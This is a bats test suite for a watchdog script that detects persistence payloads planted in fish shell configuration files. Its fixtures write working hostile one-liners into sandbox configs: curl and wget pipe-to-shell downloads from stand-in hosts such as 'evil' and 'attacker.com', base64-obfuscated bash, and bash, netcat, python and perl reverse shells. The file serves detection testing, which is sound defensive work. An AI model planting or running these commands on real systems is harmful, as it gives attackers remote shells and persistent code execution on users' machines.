#!/usr/bin/env bats
# L2 bats functional tests for the fish-config-watchdog scan script.
#
# fish sources /etc/fish/config.fish + /etc/fish/conf.d/*.fish at the start
# of each interactive/login session and auto-loads /etc/fish/functions/*.fish
# by name — so a planted snippet runs in every fish session (interactive-
# shell persistence, T1546).
#
# Notably this LOCKS the third module-specific pattern SDD-061 D-6 preserved
# verbatim — fish's broader `eval[[:space:]]*[`$(]`, which matches fish's
# parenthesised command substitution `eval (cmd)` that the canonical
# `eval[[:space:]]*[`$]` does NOT — proving the preserved extra still
# detects after migration onto module-lib.
#
# Runs the actual scan script with `logger` shadowed on PATH and config/
# baseline in a tmp sandbox via SELFDEF_FISH_*; locks the `"severity":"alert"`
# token SDD-062 routes on + the D-6 fail-loud path.
#
# Run with: bats packaging/test/L2-fish-config-watchdog.bats

WD="${BATS_TEST_DIRNAME}/../../modules/fish-config-watchdog/systemd/fish-config-watchdog.sh"
LIB="${BATS_TEST_DIRNAME}/../lib/module-lib.sh"

setup() {
    TMP="$(mktemp -d)"
    BIN="${TMP}/bin"; mkdir -p "${BIN}"
    cat > "${BIN}/logger" <<'FAKELOGGER'
#!/usr/bin/env bash
printf '%s\n' "$*" >> "${SELFDEF_TEST_LOGCAP}"
FAKELOGGER
    chmod +x "${BIN}/logger"
    export SELFDEF_TEST_LOGCAP="${TMP}/log.out"
    : > "${SELFDEF_TEST_LOGCAP}"
    BASELINE="${TMP}/baseline.tsv"
    CONF="${TMP}/config.fish"
    EMPTY="${TMP}/empty"; mkdir -p "${EMPTY}"
}

teardown() { rm -rf "${TMP}"; }

run_wd() {
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_FISH_PROFILE="${PROFILE:-report}" \
    SELFDEF_FISH_BASELINE="${BASELINE}" \
    SELFDEF_FISH_DIRS="${EMPTY}" \
    SELFDEF_FISH_FILES="${CONF}" \
    bash "${WD}"
}

cap() { cat "${SELFDEF_TEST_LOGCAP}"; }

# ============================================================
# ok tier
# ============================================================

@test "no fish config present → ok / no_fish_config" {
    run_wd
    cap | grep -q '"event":"no_fish_config"'
    cap | grep -q '"severity":"ok"'
}

@test "benign config, first run → ok / baseline_initial" {
    printf 'set -gx EDITOR vi\nfish_add_path /usr/local/bin\n' > "${CONF}"
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -q '"severity":"ok"'
    [ -f "${BASELINE}" ]
}

@test "unchanged config on second run → ok / fish_config_intact" {
    printf 'set -gx EDITOR vi\n' > "${CONF}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"fish_config_intact"'
    cap | grep -q '"severity":"ok"'
}

# ============================================================
# alert tier — incl. the PRESERVED fish eval-paren extra
# ============================================================

@test "fish parenthesised eval command-substitution → alert (preserved extra)" {
    # `eval (cmd)` is fish-specific and the canonical eval pattern misses it.
    printf 'eval (curl http://evil/payload)\n' > "${CONF}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "config with a curl|sh payload → alert (canonical pattern)" {
    printf 'curl http://evil/x | sh\n' > "${CONF}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "config with a /dev/tcp reverse shell → alert (canonical pattern)" {
    printf 'bash -i >& /dev/tcp/1.2.3.4/9 0>&1\n' > "${CONF}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

# ============================================================
# warn tier
# ============================================================

@test "benign line added after baseline → warn / fish_config_changed" {
    printf 'set -gx EDITOR vi\n' > "${CONF}"
    run_wd
    printf 'set -gx EDITOR vi\nset -gx PAGER less\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"fish_config_changed"'
    cap | grep -q '"severity":"warn"'
}

# ============================================================
# false-positive guards
# ============================================================

@test "benign fish config is NOT flagged" {
    printf 'set -gx LANG en_US.UTF-8\nabbr -a gco git checkout\n' > "${CONF}"
    run_wd
    ! cap | grep -q '"severity":"alert"'
    cap | grep -q '"severity":"ok"'
}

@test "a commented-out eval line is NOT flagged" {
    printf '# eval (curl http://evil/payload)\nset -gx EDITOR vi\n' > "${CONF}"
    run_wd
    ! cap | grep -q '"severity":"alert"'
    cap | grep -q '"severity":"ok"'
}

# ============================================================
# enforce profile + SDD-061 D-6 fail-loud
# ============================================================

@test "enforce profile exits non-zero on an alert" {
    printf 'eval (curl http://evil/payload)\n' > "${CONF}"
    PROFILE=enforce run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"severity":"alert"'
}

@test "missing module-lib → alert / module_lib_missing + non-zero exit" {
    printf 'set -gx EDITOR vi\n' > "${CONF}"
    LIB="${TMP}/nonexistent-module-lib.sh" run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"event":"module_lib_missing"'
    cap | grep -q '"severity":"alert"'
}

@test "baseline is chmod 0600 (confidentiality — fish config inventory enumerates per-login source surface)" {
    printf 'set -gx EDITOR vi\n' > "${CONF}"
    run_wd
    [ "$(stat -c '%a' "${BASELINE}")" = "600" ]
}

@test "INVARIANT (wget-pipe-sh in config): wget bootstrap → alert" {
    printf 'wget -qO- http://attacker/p | sh\n' > "${CONF}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (base64-decode-pipe in config): obfuscation → alert" {
    printf 'echo YmFzaCAtaQ== | base64 -d | bash\n' > "${CONF}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (preserved fish-eval extra — nested parens): eval (sub-cmd (subsub))" {
    # Locks that the preserved extra handles nested-parens forms of
    # fish's command substitution.
    printf 'eval (curl (echo http://evil)/payload)\n' > "${CONF}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (eval (...) with whitespace variants): eval  ( cmd )" {
    printf 'eval ( curl http://evil/payload )\n' > "${CONF}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (world-writable config → alert)" {
    printf 'set -gx EDITOR vi\n' > "${CONF}"
    run_wd
    chmod 0666 "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (group-writable config): group-writable → alert above world-writable bar" {
    printf 'set -gx EDITOR vi\n' > "${CONF}"
    run_wd
    chmod 0664 "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "JSON record is emitted as a SINGLE main logger line (downstream JSON-line consumer contract)" {
    printf 'set -gx EDITOR vi\n' > "${CONF}"
    run_wd
    main_count=$(cap | grep -cE '^-t selfdef-fish-config -- ')
    [ "${main_count}" = "1" ]
}

@test "INVARIANT (no auto-trust): fish-config-watchdog does NOT refresh baseline on injection detection — alert STAYS until operator updates" {
    # T1546 interactive-shell persistence — alert MUST persist across
    # runs until operator explicitly re-baselines.
    printf 'set -gx EDITOR vi\n' > "${CONF}"
    run_wd
    printf 'eval (curl http://evil/payload)\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # first delta — alert
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # alert STAYS
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (multi-dir scan: /etc/fish/conf.d + /etc/fish/functions + ~/.config/fish/conf.d axes — injection in EITHER → alert)" {
    CONF_D2="${TMP}/fish-conf.d"; mkdir -p "${CONF_D2}"
    printf 'set -gx EDITOR vi\n' > "${CONF}"
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_FISH_PROFILE="report" \
    SELFDEF_FISH_BASELINE="${BASELINE}" \
    SELFDEF_FISH_DIRS="${CONF_D2}" \
    SELFDEF_FISH_FILES="${CONF}" \
    bash "${WD}"
    : > "${SELFDEF_TEST_LOGCAP}"
    printf 'eval (curl http://evil/payload)\n' > "${CONF_D2}/evil.fish"
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_FISH_PROFILE="report" \
    SELFDEF_FISH_BASELINE="${BASELINE}" \
    SELFDEF_FISH_DIRS="${CONF_D2}" \
    SELFDEF_FISH_FILES="${CONF}" \
    bash "${WD}"
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (curl-pipe-bash variant — bash subshell — also detected)" {
    printf 'curl -s http://attacker.com/p | bash\n' > "${CONF}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (nc reverse-shell variant in fish config: netcat-listening pipe also detected — sister axis to /dev/tcp)" {
    # Sister to the brain-wide nc reverse-shell variant INVARIANT
    # family already locked. Fish-shell config files (config.fish +
    # conf.d/*.fish) source AS THE USER on every interactive shell
    # start — a per-login user-exec persistence surface (T1546).
    # Sister-vector to bash-completion + csh-config + shell-init on
    # the per-login-source-surface family.
    printf 'nc -e /bin/sh 1.1.1.1 4444\n' > "${CONF}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (python -c reverse-shell variant — interpreter-rev-shell axis on fish-config surface)" {
    # Sister to many other watchdog's python interpreter-rev-shell
    # INVARIANTs across the brain. Beyond bash/sh/nc, attackers
    # reach for python -c 'import socket,os,pty' to dodge shell-
    # pattern detectors. Locks the python axis on the fish per-
    # login user-exec persistence surface (T1546.004 — config.fish
    # + conf.d/*.fish sourced into every fish interactive login).
    printf 'python -c "import socket,os,pty;s=socket.socket();s.connect((\\"1.1.1.1\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);pty.spawn(\\"/bin/sh\\")"\n' > "${CONF}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (perl -e reverse-shell variant — perl-interpreter-rev-shell axis on fish-config surface)" {
    # Sister to nc / python -c / curl|bash / dev-tcp fish-config
    # rev-shell variants already locked. Perl is on every Debian/
    # Ubuntu host as dpkg/locale dependency; 'use Socket' produces
    # a one-liner connect-back PTY. Locks the perl axis on the
    # T1546.004 fish per-login source surface — config.fish +
    # conf.d/*.fish sourced into every fish interactive login,
    # planted perl rev-shell fires on every login until detected.
    printf 'perl -e "use Socket;\\$i=\\"1.1.1.1\\";\\$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\"tcp\\"));connect(S,sockaddr_in(\\$p,inet_aton(\\$i)));exec(\\"/bin/sh -i\\");"\n' > "${CONF}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (single MAIN logger record per scan — SDD-062 consumer dispatch contract)" {
    # Sister to brain-wide single-MAIN-logger-line INVARIANTs.
    printf 'bash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${CONF}"
    run_wd
    main_count=$(cap | grep -cE '^-t selfdef-fish-config -- ')
    [ "${main_count}" = "1" ]
}

@test "INVARIANT (baseline re-establish on operator out-of-band deletion: missing baseline re-creates cleanly + emits baseline_initial)" {
    # Sister to brain-wide baseline-re-establish INVARIANTs.
    # State-resilience on T1546.004 fish per-login source
    # surveillance.
    printf '# benign config\nset -gx PATH /usr/local/bin $PATH\n' > "${CONF}"
    run_wd                                              # establishes baseline
    [ -f "${BASELINE}" ]
    rm -f "${BASELINE}"                                  # operator wipe
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # must re-establish
    [ -f "${BASELINE}" ]
    cap | grep -qE '"event":"baseline_initial"'
}

@test "INVARIANT (severity bounded vocabulary {ok,warn,alert} — operator dashboard parser contract on fish-config surface)" {
    # Sister to brain-wide severity-bounded-vocabulary INVARIANTs.
    # The fish-config-watchdog MUST only emit severity values
    # from the closed set {ok,warn,alert} — never custom values
    # (critical, error, fatal, notice, info). Operator dashboard
    # parsers branch on the literal severity string; an out-of-
    # set value silently falls through routing and the operator
    # never sees the T1546.004 fish per-login source persistence
    # alert. Locks parser contract on the fish-config.d
    # detection surface.
    printf '# benign config\nset -gx PATH /usr/local/bin $PATH\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # ok / baseline
    printf 'bash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${CONF}"
    run_wd                                              # alert path
    bad=$(grep -oE '"severity":"[^"]+"' "${SELFDEF_TEST_LOGCAP}" | grep -vE '"severity":"(ok|warn|alert)"' || true)
    [ -z "${bad}" ]
}
